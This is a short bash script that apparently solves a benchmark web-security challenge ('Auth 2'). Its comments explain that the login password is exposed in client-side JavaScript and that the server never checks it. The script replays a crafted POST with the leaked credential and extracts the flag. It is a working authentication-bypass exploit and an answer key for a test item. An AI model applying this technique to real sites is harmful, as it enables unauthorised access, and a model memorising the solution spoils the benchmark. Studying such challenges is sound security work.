#!/usr/bin/env bash
# XBEN-072-24 — "Auth 2" (tags: privilege_escalation, business_logic,
# information_disclosure)
#
# The page checks the password in JavaScript, in the page it serves:
#
#     if (document.form.password.value=='sup3rsecr3t' && ...)
#
# and the server prints the flag for any POST that carries a username. So there
# are two findings and either is enough: the credential is disclosed to anyone
# who reads the page, and the server-side check does not exist.
#
# The POST is composed rather than driven precisely to show the second one: no
# JavaScript runs here, so nothing validates anything.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben072-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' \
    --set 'form.username=admin' --set 'form.password=sup3rsecr3t' \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
